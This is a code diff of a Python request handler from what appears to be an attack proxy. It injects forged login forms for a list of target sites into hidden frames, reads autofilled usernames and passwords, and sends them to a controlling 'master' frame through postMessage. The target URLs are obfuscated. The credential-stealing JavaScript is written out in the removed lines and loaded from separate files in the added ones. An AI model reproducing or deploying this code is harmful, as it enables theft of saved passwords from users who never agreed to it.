@@ -180,7 +180,7 @@ class ClientRequest(Request):
 
         host     = self.getHeader('host') 
         path     = self.getPathFromUri()           
-        if("framer.html" in path):
+        if("slaveFrame.js" in path):
            self.sendMaster()
         else:
            logging.debug("Resolving host: %s" % host)          
@@ -231,90 +231,60 @@ class ClientRequest(Request):
     def sendForgery(self,host):
 
         self.setResponseCode(200, "OK")
-        actionURL = self.getAction(host) 
-        #print "HOST: "+host + " ACTION: "+actionURL
-        form = "<form method=\"POST\" action="+actionURL+"> \
-                   <input type=\"text\" name=\"user\"/> \
-                   <input type=\"password\" name=\"pass\"/> \
-                </form>"
+        #print "HOST: "+host
+        forgery = open("forgery.js")
 
-        sendCreds = "function sendCreds(creds){ \
-                        window.parent.postMessage(window.name+\'$$$\'+creds,\'*\'); \
-                     };"
-
-        go =        "function go(){ \
-                        user=document.getElementsByName(\'user\')[0].value; \
-                        pass=document.getElementsByName(\'pass\')[0].value; \
-                        host=location.hostname; \
-                        if(pass.length > 0){ \
-                           sendCreds(host+\',\'+user+\',\'+pass); \
-                        }else{ \
-                           sendCreds(\"\"); \
-                        }; \
-                     };" \
-
-        js="<script type=\"text/javascript\">"+sendCreds+go+"setTimeout(\"go()\",500);</script>"
-       
-        data = "<html><head></head><body>"+form+js+"</body></html>"
+        data = "<html><head></head><body><form method=\"POST\" action="+self.getAction(host)+"><input type=\"text\" name=\"user\"/><input type=\"password\" name=\"pass\"/></form><script type=\"text/javascript\">"+forgery.read()+"</script></body></html>"
+        
+        forgery.close()
         self.write(data)
-
         self.finish()      
   
 
     def sendOK(self):
         self.setResponseCode(200, "OK")
         self.setHeader("Connection", "close")   
-        data = "<html><head></head><body></body></html>"
-        self.write(data)    
+        self.write("<html><head></head><body></body></html>")    
         self.finish() 
 
         
     def sendWrapUp(self):
         self.setResponseCode(200, "OK")
         self.setHeader("Connection", "close") 
-
-        js = "<script type=\"text/javascript\">  \
-                window.parent.postMessage(\"destroy masterFrame\",\"*\") \
-              </script>"
-
-        data = "<html><head>"+js+"</head><body></body></html>"
-        self.write(data)    
+        self.write("<html><head><script type=\"text/javascript\">window.parent.postMessage(\"destroy masterFrame\",\"*\")</script></head><body></body></html>")    
         self.finish()        
 
 
     def sendMaster(self):
         self.setResponseCode(200, "OK")
         self.setHeader("Connection", "keep-alive")
-        master = open("framer.html",'r+')
-        frame = master.read()
-        master.close()
-        idx = frame.find("text/javascript")
-        idx2 = frame[idx:].find(">")
-        one = frame[:idx+idx2+1]
-
-        two = ""
-        obfs_two=""
-        three = frame[idx+idx2+2:]
-         
-        fil = open("sites")
-        for filelineno,line in enumerate(fil):
-            line = line[:-1]
-            ho = line            
-            line = line.split("|")
-            ho = line[0]; 
-
-            if ho.find("http://") != -1:
-               ho = ho[7:]         
-            sep = "?"
-            if ho.find("?") != -1:
-               sep = "&"
-            two="http://"+ho+sep+"q=12345"
-            obfs_two+="\""
-            obfs_two += self.obfuscate(two)
-            obfs_two += "\","
-        fil.close() 
-        self.write(one+"var targets=["+obfs_two[:-1]+"];"+three)
+        obfuscatedTargets= ""
+        targetFile = open("sites")
         
-        #self.write(one+"var targets=["+two[:-1]+"];"+three)
+        for filelineno,line in enumerate(targetFile):
+            if "\n" in line or "\r" in line:
+                line = line[:-1]
+            line = line.split("|")
+            targetHost = line[0]; 
 
+            if targetHost.startswith("http://"):
+               targetHost = targetHost[7:]
+                    
+            if "?" in targetHost:
+               sep = "&"
+            else:
+               sep = "?"
+               
+            target="http://"+targetHost+sep+"q=12345"
+            obfuscatedTargets+="\""+self.obfuscate(target)+"\","
+            
+        obfuscatedTargets = obfuscatedTargets[:-1]
+        targetFile.close() 
+        
+        js = open("slaveFrame.js",'r+')
+        frame =  "<html><head><script type=\"text/javascript\">var targets=["+obfuscatedTargets+"];"+js.read() + "</script></head><body onload=\"init();\"></body></html>"
+        js.close()
+        
+        self.write(frame)
+        
         self.finish()
